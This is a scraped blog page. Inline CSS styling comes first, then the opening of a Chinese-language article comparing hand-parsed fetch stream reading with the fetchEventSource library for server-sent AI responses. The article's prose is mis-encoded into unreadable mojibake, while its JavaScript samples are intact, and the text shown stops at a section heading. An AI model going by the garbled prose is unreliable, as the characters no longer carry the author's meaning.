8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨å‰ç«¯æ¥å…¥<code>AI</code>ã€<code>OCR</code>æˆ–<strong>å¤§æ¨¡å‹</strong>èƒ½åŠ›æ—¶ï¼Œ<strong>æµå¼è¿”å›</strong>å‡ ä¹å·²ç»æˆä¸ºæ ‡é…ï¼šæœåŠ¡ç«¯ä¸€è¾¹è®¡ç®—ï¼Œä¸€è¾¹é€šè¿‡<code>text/event-stream</code>æŠŠç»“æœé€æ­¥æ¨é€ç»™å‰ç«¯ï¼Œç”¨æˆ·ä¹Ÿèƒ½å®æ—¶çœ‹åˆ°å†…å®¹ç”Ÿæˆçš„è¿‡ç¨‹ã€‚çœ‹èµ·æ¥è¿™æ˜¯ä¸€ä¸ªå·²ç»è¢«â€œæ ‡å‡†åŒ–â€çš„æŠ€æœ¯åœºæ™¯ï¼Œä½†çœŸæ­£è½åˆ°å·¥ç¨‹å®è·µä¸­ï¼Œå¾ˆå¤šäººéƒ½ä¼šé‡åˆ°ä¸€ä¸ªéå¸¸éšè”½ã€å´æå…¶è‡´å‘½çš„é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>åŒæ ·æ˜¯æµå¼è¯·æ±‚ï¼Œæœ‰çš„å®ç°ç¨³å®šå¯é ï¼Œæœ‰çš„å´æ€»æ˜¯å°‘å­—ã€æ–­å¥ã€å†…å®¹ä¸¢å¤±ï¼Œç”šè‡³å®Œå…¨æ— æ³•å¤ç° Bugã€‚</strong></p>
</blockquote>
<p>æœ€å¸¸è§çš„å¯¹æ¯”ï¼Œå°±æ˜¯ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>fetch + response.body.getReader()</code>ï¼šé—®é¢˜é¢‘å‘ï¼Œå´å¾ˆéš¾å®šä½</li>
<li>ä½¿ç”¨<code>fetchEventSource</code>ï¼šå‡ ä¹ä¸å‡ºé—®é¢˜</li>
</ul>
<p>ä¹ä¸€çœ‹ï¼Œä¸¤è€…éƒ½åŸºäº<code>fetch</code>ï¼Œéƒ½èƒ½â€œè¾¹æ”¶è¾¹å¤„ç†æ•°æ®â€ï¼Œç”šè‡³æœåŠ¡ç«¯è¿”å›çš„æ•°æ®å®Œå…¨ä¸€è‡´ï¼Œä½†å®é™…æ•ˆæœå´å¤©å·®åœ°åˆ«ã€‚å¾ˆå¤šäººä¼šæŠŠåŸå› å½’ç»“ä¸ºâ€œç½‘ç»œä¸ç¨³å®šâ€æˆ–â€œæµè§ˆå™¨<code>bug</code>â€ï¼Œå´å¿½ç•¥äº†ä¸€ä¸ªæ›´å…³é”®çš„äº‹å®ï¼š</p>
<blockquote>
<p><strong>é—®é¢˜å¹¶ä¸å‡ºåœ¨ç½‘ç»œå±‚ï¼Œè€Œå‡ºåœ¨å‰ç«¯å¯¹â€œæµâ€çš„ç†è§£å±‚çº§ä¸Šã€‚</strong></p>
</blockquote>
<p>æœ¬æ–‡å°†åŸºäºä¸€æ¬¡çœŸå®çš„å·¥ç¨‹å®è·µï¼Œå¯¹æ¯”<code>fetchEventSource</code>ä¸<code>fetch</code>æ‰‹åŠ¨è¯»å–æµè¿™ä¸¤ç§å®ç°æ–¹å¼ï¼Œä»<strong>åè®®å±‚ã€ä¼ è¾“å±‚åˆ°å‰ç«¯è§£æå±‚</strong>é€å±‚æ‹†è§£å®ƒä»¬çš„æœ¬è´¨åŒºåˆ«ï¼Œé‡ç‚¹åˆ†æï¼š</p>
<ul>
<li><strong>2</strong>ç§æ–¹å¼åœ¨è®¾è®¡ç›®æ ‡ä¸Šçš„æ ¹æœ¬å·®å¼‚</li>
<li>ä¸ºä»€ä¹ˆæ‰‹å†™æµè§£æææ˜“å‡ºç°â€œçœ‹ä¸è§çš„ä¸¢æ•°æ®â€</li>
<li>ä»¥åŠè¿™äº›â€œä¸¢åŒ…é—®é¢˜â€ç©¶ç«Ÿæ˜¯å¦‚ä½•åœ¨å‰ç«¯è§£æé˜¶æ®µæ‚„ç„¶å‘ç”Ÿçš„</li>
</ul>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ åœ¨ä¸‹æ¬¡é¢å¯¹æµå¼æ¥å£æ—¶ï¼Œä¸å†åªåœç•™åœ¨â€œèƒ½è·‘å°±è¡Œâ€ï¼Œè€Œæ˜¯çœŸæ­£ç«™åœ¨<strong>æ­£ç¡®çš„æŠ½è±¡å±‚</strong>ä¸Šåšé€‰æ‹©ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€å…ˆçœ‹é¡¹ç›®ä¸­è¿™ä¸¤æ®µä»£ç åœ¨â€œåšä»€ä¹ˆâ€</h2>
<p>é‚£å¼€å§‹è¿™æ¬¡çš„ä¸»é¢˜ï¼Œå…ˆæ¥çœ‹çœ‹é¡¹ç›®ä¸­æ›¾å†™è¿‡çš„ä¸¤æ®µä»£ç ï¼Œé¦–å…ˆæ¥çœ‹çœ‹ä½¿ç”¨<code>fetch + reader</code>æ¥å®ç°æµå¼è¯»å–çš„ä»£ç ã€‚</p>
<h3 data-id="heading-2">1ï¸âƒ£ fetch + readerï¼šç«™åœ¨ã€Œå­—èŠ‚æµã€å·¥ä½œ</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">res</span> = await fetch(url, { method: <span class="hljs-string">"POST"</span>, body: formData })
const <span class="hljs-attr">reader</span> = res.body!.getReader()
const <span class="hljs-attr">decoder</span> = new TextDecoder(<span class="hljs-string">"utf-8"</span>)

while (!done) {
  const { value } = await reader.read()
  let <span class="hljs-attr">chunk</span> = decoder.decode(value)

  // å¤„ç†RECORD_ID
  if (chunk.includes('RECORD_ID') || chunk.match(/^\d+:end/)) {
    const <span class="hljs-attr">match1</span> = chunk.match(/^data:RECORD_ID:(\d+):end(.*)$/s)  
    const <span class="hljs-attr">match2</span> = chunk.match(/^RECORD_ID:(\d+):end(.*)$/s)       
    const <span class="hljs-attr">match3</span> = chunk.match(/^(\d+):end(.*)$/s)                
    const <span class="hljs-attr">match4</span> = chunk.match(/^RECORD_ID:(\d+)(.*)$/s)           

    const <span class="hljs-attr">match</span> = match1 || match2 || match3 || match4
    if (match) {
      const <span class="hljs-attr">idMatch</span> = match[<span class="hljs-number">1</span>]
      if (idMatch) {
        <span class="hljs-attr">recordId.value</span> = parseInt(idMatch)
      }
    }
  }

  // å»é™¤data:
  <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'data:'</span>, <span class="hljs-string">''</span>)
  // å»é™¤RECORD_ID:xxx
  <span class="hljs-attr">chunk</span> = chunk.replace(/RECORD_ID:\d+/g, <span class="hljs-string">''</span>)
  // å»é™¤:end
  <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">':end'</span>, <span class="hljs-string">''</span>)
  // å»é™¤æ¢è¡Œ
  <span class="hljs-attr">chunk</span> = chunk.replace(/\n+/g, <span class="hljs-string">''</span>)

  // å¤„ç†STREAM_COMPLETEï¼ˆç»“æŸæ ‡è®°ï¼‰
  if (chunk.includes('STREAM_COMPLETE')) {
    <span class="hljs-attr">chunk</span> = chunk.replaceAll(<span class="hljs-string">'STREAM_COMPLETE'</span>, <span class="hljs-string">''</span>)
    <span class="hljs-attr">isStreaming.value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-attr">done</span> = <span class="hljs-literal">true</span>
  }
  inputValue.value += chunk
}

</code></pre>
<p>è¿™æ®µä»£ç çš„ç‰¹ç‚¹éå¸¸æ˜æ˜¾ï¼š</p>
<ul>
<li>æ‹¿åˆ°çš„æ˜¯<strong>ä¸å®šé•¿Uint8Array</strong></li>
<li>æ¯æ¬¡<code>read()</code>ï¼š
<ul>
<li><strong>å¯èƒ½æ˜¯åŠæ¡æ¶ˆæ¯</strong></li>
<li><strong>ä¹Ÿå¯èƒ½æ˜¯å¤šæ¡æ¶ˆæ¯æ‹¼åœ¨ä¸€èµ·</strong></li>
</ul>
</li>
<li>æ‰€æœ‰åè®®è§£æé€»è¾‘éƒ½åœ¨å‰ç«¯è‡ªå·±å†™</li>
</ul>
<p>ğŸ‘‰ æœ¬è´¨ä¸Šæ˜¯åœ¨ <strong>â€œè‡ªå·±å®ç°ä¸€ä¸ªSSEè§£æå™¨â€</strong> ã€‚</p>
<h3 data-id="heading-3">2ï¸âƒ£ fetchEventSourceï¼šç«™åœ¨ã€Œäº‹ä»¶å±‚ã€å·¥ä½œ</h3>
<p>ç„¶åå†æ¥çœ‹çœ‹ä½¿ç”¨<code>fetchEventSource</code>æ’ä»¶ä¼˜åŒ–è¿‡çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchEventSource</span>(<span class="hljs-string">`<span class="hljs-subst">${baseURL4}</span>/ai/imgToStr`</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">"POST"</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-title class_">Accept</span>: <span class="hljs-string">"text/event-stream"</span>,
    <span class="hljs-string">"access-token"</span>: <span class="hljs-title function_">getToken</span>()
  },
  <span class="hljs-attr">body</span>: formData,
  <span class="hljs-attr">openWhenHidden</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// é¡µé¢ç¦»å¼€å†å›æ¥ä¹Ÿä¼šç»§ç»­è¯·æ±‚</span>
  <span class="hljs-attr">onmessage</span>: <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">data</span>)
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">data</span>.<span class="hljs-property">event</span> === <span class="hljs-string">"recordId"</span>) {
      recordId.<span class="hljs-property">value</span> = data.<span class="hljs-property">data</span>.<span class="hljs-property">content</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">data</span>.<span class="hljs-property">event</span> === <span class="hljs-string">"message"</span>) {
      inputValue.<span class="hljs-property">value</span> += data.<span class="hljs-property">data</span>.<span class="hljs-property">content</span>
    }
  },
  <span class="hljs-attr">onerror</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-keyword">throw</span> err
  }
})

</code></pre>
<p>å¯ä»¥æ³¨æ„åˆ°å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<ul>
<li>æ²¡æœ‰è‡ªå·±å¤„ç†<code>chunk</code></li>
<li>æ²¡æœ‰è‡ªå·±æ‹†åˆ†æ¢è¡Œ</li>
<li>ç›´æ¥æ‹¿åˆ°<code>e.data</code>ï¼Œå°±æ˜¯ä¸€æ¡å®Œæ•´äº‹ä»¶</li>
</ul>
<p>ğŸ‘‰ å› ä¸ºï¼š<code>fetchEventSource</code><strong>å¹¶ä¸æ˜¯â€œè¯»å­—èŠ‚æµâ€</strong> ï¼Œè€Œæ˜¯ï¼š<strong>ä¸¥æ ¼æŒ‰ç…§ SSE åè®®ï¼Œè§£æå®Œä¸€æ•´æ¡äº‹ä»¶åï¼Œæ‰å›è°ƒonmessage</strong></p>
<h2 data-id="heading-4">äºŒã€ä»€ä¹ˆæ˜¯SSEåè®®ï¼Ÿ</h2>
